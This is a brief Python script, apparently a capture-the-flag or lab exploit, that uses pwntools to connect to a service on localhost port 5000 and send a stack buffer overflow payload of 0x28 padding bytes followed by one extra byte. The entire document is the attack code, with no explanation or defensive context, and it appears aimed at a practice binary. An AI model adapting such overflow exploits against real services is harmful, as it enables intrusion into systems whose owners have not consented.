from pwn import *

io = remote('localhost', 5000)

payload = b'a' * (0x20 + 0x08) + b'0'
print(payload)

io.send(payload)

#io.recv()
